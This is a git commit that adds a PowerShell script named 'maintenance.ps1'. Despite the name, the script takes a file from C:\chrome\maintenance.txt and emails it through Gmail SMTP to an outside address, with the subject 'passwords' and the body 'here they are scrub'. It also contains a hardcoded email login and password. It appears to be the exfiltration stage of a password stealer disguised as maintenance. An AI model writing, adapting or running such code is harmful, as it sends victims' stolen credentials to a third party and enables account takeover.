51ad7d105ec68461c36ea1873b5acf78fdd79e45
abdulaziesmuslim <abdulazies55@gmail.com>
2020-05-19 16:19:54 +0700

    Script

---
+++ maintenance.ps1
@@ -0,0 +1,22 @@
+$Username = "aaa290898@gmail.com";
+$Password= "aaaaaa290898";
+$path= "C:\chrome\maintenance.txt"
+
+function Send-ToEmail([string]$email, [string]$attachmentpath){
+
+    $message = new-object Net.Mail.MailMessage;
+    $message.From = $Username;
+    $message.To.Add($email);
+    $message.Subject = "passwords";
+    $message.Body = "here they are scrub";
+    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
+    $message.Attachments.Add($attachment);
+
+    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
+    $smtp.EnableSSL = $true;
+    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
+    $smtp.send($message);
+    write-host "Mail Sent" ; 
+    $attachment.Dispose();
+ }
+Send-ToEmail  -email "abdulazies55@gmail.com" -attachmentpath $path;
